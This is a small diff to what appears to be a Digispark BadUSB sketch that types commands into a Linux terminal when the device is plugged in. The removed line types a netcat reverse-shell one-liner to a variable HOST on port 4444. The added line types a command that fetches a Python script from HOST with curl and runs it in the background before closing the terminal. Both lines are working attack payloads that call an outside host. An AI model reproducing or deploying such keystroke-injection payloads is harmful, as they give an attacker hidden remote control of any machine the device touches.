@@ -129,9 +129,9 @@ void linux_keyboard()
 
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
-    DigiKeyboard.delay(100);
+    DigiKeyboard.delay(300);
 
-    DigiKeyboard.println(" nohup $(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "HOST" 4444 >/tmp/f)& exit");
+    DigiKeyboard.println("nohup (python <(curl -s http://"HOST"/python.py))& exit");
 
     DigiKeyboard.delay(100);
 
